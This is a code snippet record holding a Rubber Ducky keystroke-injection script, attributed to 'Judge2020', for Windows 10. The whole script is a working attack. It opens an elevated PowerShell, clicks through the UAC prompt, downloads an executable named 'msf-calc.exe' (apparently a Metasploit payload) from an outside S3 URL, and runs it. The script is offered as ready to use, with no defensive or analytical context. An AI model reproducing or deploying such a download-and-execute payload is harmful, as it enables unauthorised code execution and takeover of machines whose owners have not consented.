---
id: c5b1f5cd-ecd2-4649-8081-056f78061b39
type: code
language: Rubber Ducky
verified: false
created_at: '2020-02-20T02:58:18.424427+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet c5b1f5cd

**Language**: Rubber Ducky

```rubber ducky
REM Windows 10: Poweshell administrator download and execute file
REM Author: Judge2020
REM author website: Judge2020.com
REM
REM start of script
REM
REM let the HID enumerate
DELAY 1000
GUI r
DELAY 200
REM my best attempt at a elevated powershell instance
STRING powershell Start-Process powershell -Verb runAs
ENTER
DELAY 2500
ALT y
DELAY 200
STRING $down = New-Object System.Net.WebClient; $url = 'http://4a4a8f4331a58e913893a5d58b03221f-redstack.s3.amazonaws.com/msf-calc.exe'; $file = 'msf-calc.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;
ENTER
```
